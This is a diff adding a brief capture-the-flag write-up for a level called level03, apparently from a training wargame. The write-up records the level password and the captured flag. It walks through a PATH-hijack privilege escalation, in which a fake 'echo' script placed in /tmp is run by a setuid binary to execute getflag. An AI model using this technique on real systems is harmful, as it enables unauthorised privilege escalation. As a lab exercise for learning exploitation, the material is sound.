@@ -1,0 +1,11 @@
+level03 : kooda2puivaav1idi4f57q8iq
+Process :
+    - Launch level03 : Exploit me
+    - Launch strings level03 (/usr/bin/env echo Exploit me)
+    - Launch ls -la level03 (-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03)
+    - mkdir /tmp/mybin
+    - echo '#!/bin/sh' > /tmp/mybin/echo
+    - echo 'getflag' >> /tmp/mybin/echo
+    - chmod +x /tmp/mybin/echo
+    - export PATH=/tmp/mybin:$PATH
+    - Launch ./level03 and get the flag (getflag = qi0maab88jeaj46qoumi7maus)
